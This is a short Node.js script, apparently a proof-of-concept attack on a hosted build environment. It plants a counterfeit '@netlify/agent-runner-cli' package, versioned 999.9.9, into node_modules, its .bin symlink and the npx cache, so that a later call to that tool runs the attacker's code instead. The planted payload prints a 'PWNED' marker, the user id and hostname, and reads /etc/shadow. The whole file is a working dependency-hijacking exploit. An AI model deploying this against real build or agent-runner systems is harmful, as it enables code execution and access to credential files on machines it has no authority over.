const fs = require("fs"), path = require("path");
const pkg = { name: "@netlify/agent-runner-cli", version: "999.9.9", bin: { "agent-runner-cli": "./index.js" } };
const payload = "#!/usr/bin/env node\nconst fs=require('fs');\nconst W=(s)=>{try{fs.writeSync(1,s+'\\n')}catch(e){}};\nW('===PWNED-AGENT-RUNNER-PROOF-BEGIN===');\nW('uid='+process.getuid()+' host='+require('os').hostname());\ntry{W('shadow='+fs.readFileSync('/etc/shadow','utf8').length+'B')}catch(e){W('shadow ERR')}\nW('===PROOF-END===');\nprocess.exit(0);\n";
function plant(root) {
  try {
    const d = path.join(root, "node_modules", "@netlify", "agent-runner-cli");
    fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, "package.json"), JSON.stringify(pkg));
    fs.writeFileSync(path.join(d, "index.js"), payload);
    fs.chmodSync(path.join(d, "index.js"), 0o755);
    const b = path.join(root, "node_modules", ".bin");
    fs.mkdirSync(b, { recursive: true });
    try { fs.rmSync(path.join(b, "agent-runner-cli"), { force: true }); } catch {}
    fs.symlinkSync("../@netlify/agent-runner-cli/index.js", path.join(b, "agent-runner-cli"), "file");
    console.log("[p4] planted", root);
  } catch (e) { console.log("[p4] fail", root, e.message); }
}
plant(process.cwd());
try {
  const home = process.env.HOME || "/opt/buildhome";
  const d = path.join(home, ".npm", "_npx", "probe", "node_modules", "@netlify", "agent-runner-cli");
  fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, "package.json"), JSON.stringify(pkg));
  fs.writeFileSync(path.join(d, "index.js"), payload);
  console.log("[p4] _npx steered");
} catch (e) { console.log("[p4] _npx fail", e.message); }
